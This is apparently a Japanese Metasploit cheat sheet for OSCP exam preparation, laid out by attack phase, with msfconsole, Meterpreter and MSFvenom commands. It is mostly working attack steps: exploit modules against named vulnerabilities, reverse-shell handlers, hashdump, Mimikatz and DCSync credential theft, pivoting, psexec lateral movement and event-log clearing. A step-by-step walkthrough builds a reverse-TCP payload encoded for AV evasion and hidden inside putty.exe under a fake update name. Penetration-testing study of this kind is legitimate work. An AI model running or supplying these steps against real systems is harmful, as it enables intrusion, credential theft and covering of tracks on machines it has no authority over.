# Metasploit

## 🎯 概要
**Metasploit Framework (MSF)** は、ペネトレーションテストの全ライフサイクルをサポートする世界で最も利用されているオープンソースのエクスプロイトフレームワークです。情報収集、脆弱性スキャン、エクスプロイトの実行、そして侵入後のポストエクスプロイト（後続操作）までを統合されたインターフェース（msfconsole）で提供します。OSCP試験においては、リバースシェルのハンドラー（multi/handler）としての利用や、手動エクスプロイトを確実に行うための補助ツールとして極めて重要な役割を果たします。

---

## 🛠 代表的な用途
- **エクスプロイトの実行**: 数千規模の公開脆弱性に対する攻撃モジュールを即座に利用可能。
- **ペイロードの生成と管理**: Meterpreterなどの高度なペイロードを使用して、ターゲットの完全な制御を奪取。
- **侵入後の詳細調査**: 認証情報のダンプ、トークンの偽装、権限昇格、内部ネットワークへのピボット。
- **脆弱性スキャン**: 各種サービス（SMB, HTTP, MSSQL等）のバージョン特定や設定ミスの自動検出。
- **OSCPでの利用ポイント**: 試験では「商用ツール/自動攻撃ツール」の制限がありますが、`multi/handler`（リスナー）や個別のエクスプロイトモジュール、MSFvenomによるペイロード作成は必須スキルです。

---

## 🔍 基本コマンド
```bash
# Metasploitを起動（-qはバナー非表示）
msfconsole -q

# モジュールの検索
search [キーワード]

# モジュールの選択
use [モジュール名]

# 設定オプションの表示
show options

# オプションの設定
set [変数名] [値]

# エクスプロイトの実行
exploit

# 補助モジュールの実行
run
```

---

## 🧪 よく使う攻撃シナリオ
- **脆弱なサービスへの直接攻撃**: `ms08_067_netapi` や `vsftpd_234_backdoor` などの既知の脆弱性を利用して初期侵入を達成。
- **クライアントサイド攻撃**: 悪意のあるPDF（`adobe_pdf_embedded_exe`）やOffice文書を生成し、ユーザーの操作を介してリバースシェルを確立。
- **リレー/ピボット**: 侵入したホストを中継地点として、外部から直接アクセスできない内部ネットワーク（172.16.x.x 等）をスキャン・攻撃。

---

## 📌 フェーズ別コマンド例  

### 🔎 OSINT（外部情報収集）
```bash
# Shodan APIを使用して外部公開されている脆弱なホストを特定
use auxiliary/gather/shodan_search
set SHODAN_APIKEY [YOUR_KEY]
set QUERY "Apache/2.4.49"
run

# 公開メールアドレスの検索（Search_email_collector）
use auxiliary/gather/search_email_collector
set DOMAIN target.com
run
```

---

### 🔎 Reconnaissance（技術的偵察）
```bash
# Nmapスキャンを実行し結果をデータベースに自動保存
db_nmap -sS -A -v [TARGET_IP]

# データベースに保存されたホスト一覧を表示
hosts

# 特定されたサービス一覧を表示
services

# HTTPレスポンスヘッダーからサーバー情報を特定
use auxiliary/scanner/http/http_version
set RHOSTS [TARGET_IP_RANGE]
run
```

---

### 🧭 Enumeration（外部サービスの詳細調査）
```bash
# SMBのバージョン特定（脆弱性特定の足がかり）
use auxiliary/scanner/smb/smb_version
set RHOSTS [TARGET_IP]
run

# 公開されているSMB共有フォルダを列挙
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS [TARGET_IP]
run

# Webサーバー上の隠しディレクトリを探索
use auxiliary/scanner/http/dir_scanner
set RHOSTS [TARGET_IP]
run

# SNMPコミュニティ名の総当たり
use auxiliary/scanner/snmp/snmp_login
set RHOSTS [TARGET_IP]
run
```

---

### 🚪 Initial Access（初期侵入）
```bash
# リバースシェルの待ち受け（ハンドラーの起動）
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST [ATTACKER_IP]
set LPORT 4444
run

# 古いWindowsサーバー（MS08-067）へのエクスプロイト
use exploit/windows/smb/ms08_067_netapi
set RHOSTS [TARGET_IP]
set payload windows/meterpreter/reverse_tcp
exploit

# 脆弱なFTPサーバーへの攻撃
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS [TARGET_IP]
exploit
```

---

### 📋 Local Enumeration（侵入後のローカル調査）
```bash
# システム情報（OS, アーキテクチャ等）を表示
meterpreter > sysinfo

# 現在のユーザー権限を確認
meterpreter > getuid

# 実行中のプロセス一覧とユーザーを表示
meterpreter > ps

# 利用可能な権限（Privileges）の一覧表示
meterpreter > getprivs

# ターゲットのブラウザ履歴やファイルを検索
meterpreter > run post/windows/gather/enum_applications
meterpreter > search -f *.doc
```

---

### 📈 Privilege Escalation（権限昇格）
```bash
# 権限昇格の候補（Local Exploit）を自動提案
use post/multi/recon/local_exploit_suggester
set SESSION [ID]
run

# Windowsの「SYSTEM」権限奪取を試行
meterpreter > getsystem

# トークン奪取モジュールをロードしてドメイン管理者トークンを検索
meterpreter > use incognito
meterpreter > list_tokens -u

# 特定のサービス権限を悪用した昇格
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
set SESSION [ID]
run
```

---

### 🔑 Credential Access（認証情報探索）
```bash
# メモリ内（SAMデータベース等）のパスワードハッシュをダンプ
meterpreter > hashdump

# Mimikatz（Kiwi）をロードして平文パスワードを取得
meterpreter > load kiwi
meterpreter > creds_all

# LSAシークレット（サービスアカウント情報等）のダンプ
meterpreter > lsa_dump_secrets
```

---

### 🌐 Internal Enumeration（内部ネットワーク探索）
```bash
# ターゲットマシン上のルート情報を確認し、到達可能なサブネットを特定
meterpreter > run get_local_subnets

# 内部ネットワークに対してPingスイープを実行
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/24

# 侵入済みホストを介した内部ポートスキャン
use auxiliary/scanner/portscan/tcp
set RHOSTS 172.16.5.50
set PORTS 1-1024
run
```

---

### 🚪 Pivot / Port Forward（内部サービスへのアクセス）
```bash
# 自動ルーティング設定（内部ネットワークへの通信をセッション経由にする）
use multi/manage/autoroute
set SESSION [ID]
run

# ローカルポート転送（ターゲットの3389を攻撃者の3389へ転送）
meterpreter > portfwd add -l 3389 -p 3389 -r [TARGET_INTERNAL_IP]

# SOCKSプロキシサーバーを起動し、Proxychains等から全内部アクセスを可能にする
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set VERSION 5
run -j
```

---

### 🚀 Lateral Movement（横展開）
```bash
# 奪取した管理者資格情報を使用して別ホストを攻撃
use exploit/windows/smb/psexec
set RHOSTS [ANOTHER_TARGET_IP]
set SMBUser [USERNAME]
set SMBPass [PASSWORD_OR_HASH]
exploit

# SSH認証情報を用いた他ホストへの接続
use exploit/multi/ssh/sshexec
set RHOSTS [INTERNAL_IP]
set USERNAME [USER]
set PASSWORD [PASS]
run
```

---

## 🏢 Active Directory（AD）
```bash
# ドメインコントローラー（DC）の特定
use auxiliary/gather/enum_domain
set SESSION [ID]
run

# AD内のユーザー一覧と属性を列挙
use auxiliary/gather/ad_enum_users
set DOMAIN [DOMAIN_NAME]
run

# DCSync攻撃によりDCから全ドメインハッシュを取得（SYSTEM権限必要）
meterpreter > load kiwi
meterpreter > dcsync_ntlm [DOMAIN_USER]
```

---

## 🧰 便利オプション一覧
- `exploit -j`: エクスプロイトをジョブとしてバックグラウンドで実行。
- `exploit -z`: セッションが確立しても対話モードに入らない。
- `setg [変数名]`: 変数をグローバル設定にする（別のモジュールに切り替えても値が維持される）。
- `sessions -l`: 確立済みの全セッションを表示。
- `sessions -i [ID]`: 指定したセッションにインタラクティブに接続。
- `resource [file.rc]`: コマンドが記述されたリソースファイルを読み込んで一括実行。

---

### 各ツールのオプション一覧

#### **msfconsole** (フレームワークのメインインターフェース)
MSFの全機能にアクセスするための統合コンソールです。

| コマンド | 説明 |
| :--- | :--- |
| `use <module>` | 指定したモジュール（exploit, auxiliary等）をロードする。 |
| `search <term>` | 指定したキーワードでモジュールを検索する。 |
| `show <type>` | 指定したタイプ（exploits, payloads, options等）のリストを表示する。 |
| `set <option> <value>` | モジュールのオプション（RHOSTS, LPORT等）に値を設定する。 |
| `setg <option> <value>` | 変数をグローバルに設定し、モジュールを切り替えても維持する。 |
| `exploit` または `run` | 攻撃または補助モジュールを実行する。 |
| `sessions -i <ID>` | 確立されたセッションにインタラクティブに接続する。 |
| `db_nmap` | Nmapスキャンを実行し、結果をMSFデータベースに直接保存する。 |
| `resource <file.rc>` | コマンドが記述されたリソースファイルを読み込み、自動実行する。 |
| `background` | 現在のセッションを維持したままコンソールに戻る。 |

#### **Meterpreter** (高度なペイロード)
侵入後のターゲット操作に特化した、メモリ内で動作するDLLインジェクション型ペイロードです。

| コマンド | 説明 |
| :--- | :--- |
| `sysinfo` | ターゲットのOS、アーキテクチャ、言語等の情報を取得する。 |
| `getuid` | 現在実行しているユーザーのIDを確認する。 |
| `getsystem` | WindowsでSYSTEM権限への昇格を試みる。 |
| `hashdump` | SAMデータベースからパスワードハッシュをダンプする。 |
| `ps` | 実行中のプロセス一覧を表示する。 |
| `migrate <PID>` | 別のプロセス（Explorer.exe等）に自身を移行させ、安定化させる。 |
| `screenshot` | ターゲットのデスクトップ画面をキャプチャする。 |
| `upload / download` | ファイルをターゲットへアップロード、またはターゲットからダウンロードする。 |
| `keyscan_start / dump` | キーボード入力をキャプチャし、その内容を表示する。 |
| `shell` | ターゲットの標準的なコマンドプロンプト/シェルを取得する。 |
| `portfwd` | ローカルポートをリモートへ転送し、内部ネットワークへのアクセスを可能にする。 |
| `clearev` | アプリケーション、システム、セキュリティのイベントログを消去する。 |

#### **MSFvenom** (スタンドアロン・ペイロード生成)
ペイロードの生成とエンコード（難読化）を統合したツールです。

| オプション | 説明 |
| :--- | :--- |
| `-p, --payload` | 使用するペイロードを指定する（例：`windows/x64/meterpreter/reverse_tcp`）。 |
| `-f, --format` | 出力形式（exe, elf, asp, raw, python等）を指定する。 |
| `-e, --encoder` | 使用するエンコーダ（例：`x86/shikata_ga_nai`）を指定する。 |
| `-i, --iterations` | エンコードを繰り返す回数を指定する。 |
| `-b, --bad-chars` | シェルコードから除外すべき特定のバイト（例：`\x00\x0a`）を指定する。 |
| `-x, --template` | 既存の正規バイナリ（calc.exe等）をテンプレートとして使い、バックドア化する。 |
| `-k, --keep` | テンプレートの正規機能を維持したまま、別スレッドでペイロードを実行する。 |
| `-o, --out` | 生成されたペイロードを指定したファイル名で保存する。 |
| `-l, --list` | 利用可能なpayloads, encoders, formats等の一覧を表示する。 |

---

## 🚀 実践例

```bash
# 【実践1】Webアプリの脆弱性(Drupal)を突いてリバースシェルを奪取
msf6 > search drupalgeddon
msf6 > use exploit/multi/http/drupal_drupalgeddon2
msf6 exploit(...) > set RHOSTS 10.10.10.15
msf6 exploit(...) > set LHOST 10.10.14.2
msf6 exploit(...) > exploit

# 【実践2】Meterpreterから別のプロセスへ移行（検知回避と安定化）
meterpreter > ps
meterpreter > migrate [Explorer.exeなどのPID]

# 【実践3】証跡の隠蔽（イベントログの消去）
meterpreter > clearev
```
### 実践攻撃シナリオ：一連の流れ

以下は、MSFvenomで作成したペイロードをターゲットに送り、msfconsoleで待ち受け、Meterpreterで情報を収集する一連の攻撃フローです。

#### **ステップ1: MSFvenomによる悪意のあるバイナリ作成**
攻撃者の端末で、Windows用のリバースMeterpreterペイロードを生成します。
```bash
# shikata_ga_naiで10回エンコードし、正規ファイル(putty.exe)に偽装したペイロードを作成
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=4444 -e x86/shikata_ga_nai -i 10 -x putty.exe -k -f exe -o backup_update.exe
```

#### **ステップ2: msfconsoleでのリスナー（待ち受け）設定**
攻撃者の端末でMSFを起動し、ターゲットからの接続を待機します。
```bash
msfconsole -q
msf > use exploit/multi/handler
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST 192.168.20.9
msf exploit(multi/handler) > set LPORT 4444
msf exploit(multi/handler) > exploit -j  # バックグラウンドジョブとして実行
```

#### **ステップ3: ターゲットでの実行とセッション確立**
ターゲットが `backup_update.exe` を実行すると、攻撃者のコンソールにセッションが開きます。
```bash
[*] Meterpreter session 1 opened (192.168.20.9:4444 -> 192.168.20.10:1033)
```

#### **ステップ4: Meterpreterによるポストエクスプロイト（事後操作）**
確立したセッションに入り、システム情報の収集や権限昇格を行います。
```bash
msf exploit(multi/handler) > sessions -i 1
meterpreter > sysinfo         # システム情報の確認
meterpreter > getuid          # 現在の権限確認
meterpreter > getsystem       # SYSTEM権限への昇格
meterpreter > migrate -f      # 安定したプロセス(notepad等)へ自動移行
meterpreter > hashdump        # パスワードハッシュの取得
meterpreter > screenshot      # デスクトップの監視
```

### 実践例の補足
*   **自動化**: リソースファイル（`.rc`）を使用することで、これらの一連の操作（リスナーの起動、オプション設定）を、`msfconsole -r script.rc` のように1コマンドで自動化できます。
*   **検知回避**: 単純なエンコード（shikata_ga_nai）だけでは現代のAV（アンチウイルス）を回避できないため、`-x` で正規ファイルに埋め込む手法や、Veilなどの外部ツールと組み合わせる手法が推奨されます。

---

### 役割と使いどころの比較表

| 項目 | **msfconsole** | **Meterpreter** | **MSFvenom** |
| :--- | :--- | :--- | :--- |
| **主な役割** | フレームワークの制御、偵察、脆弱性スキャン、攻撃実行 | 侵入後の持続的な遠隔操作、権限昇格、情報窃取 | ペイロードの作成、エンコードによる検知回避 |
| **実行場所** | 攻撃者のローカルマシン | ターゲットマシンのメモリ内（ディスクを汚さない） | 攻撃者のローカルマシン（事前準備として実行） |
| **主な使いどころ** | 攻撃の初期段階。脆弱性を探し、攻撃を仕掛ける際。 | 攻撃成功後。システムを完全に制御し、目的を達成する際。 | エクスプロイトコードに埋め込むコードや、配布用ファイルを作る際。 |
| **インターフェース** | インタラクティブなCLI（対話型コマンドライン） | 専用のポストエクスプロイト用コマンドセット | 非対話型のスタンドアロンコマンド |
| **依存関係** | PostgreSQLデータベース等と連携 | 確立された通信チャネル（Session）が必要 | 独立して動作可能（MSF本体なしでも可） |

---

## 🧩 他ツールとの組み合わせ
- **Nmap** → `db_import nmap_output.xml` でスキャン結果をMetasploitに取り込み、`hosts` コマンドで管理可能。
- **MSFvenom** → カスタムペイロード（`.exe`, `.php`, `.elf`等）を生成し、Metasploitの `multi/handler` で待ち受ける。
- **SearchSploit** → `searchsploit -m [EDB-ID]` でダウンロードしたエクスプロイトを `~/.msf4/modules/` にコピーして即座に利用。
- **Burp Suite** → Proxy経由でMetasploitのHTTPリクエストをBurpに通して、挙動を詳細にデバッグ。

---

## 📝 注意点（OSCP 試験での使い方）
- **自動攻撃ツールの制限**: `db_autopwn` などの「自動的に次々と攻撃を試行するツール」は試験で使用禁止です。
- **1回制限ルール**: メタスプロイトの**「エクスプロイトモジュール」**（侵入に使用するもの）は、**試験全体で1つのターゲットホストに対して1回のみ**使用可能です。
- **制限対象外**: `multi/handler`（ハンドラー）、MSFvenom、補助モジュール（Auxiliary）、ポストエクスプロイトモジュール（Post）は制限なく使用できます。
- **後片付け**: 侵入後に作成した一時ファイル（`/tmp/` 内のペイロードなど）は、試験終了前に必ず削除してクリーンアップしてください。

---

## 🔗 参考リンク
- 公式：[Metasploit Documentation](https://docs.metasploit.com/)
- 良質解説：[Metasploit Unleashed (OffSec)](https://www.offsec.com/metasploit-unleashed/)
- チートシート：[SANS Metasploit Cheat Sheet](https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf)
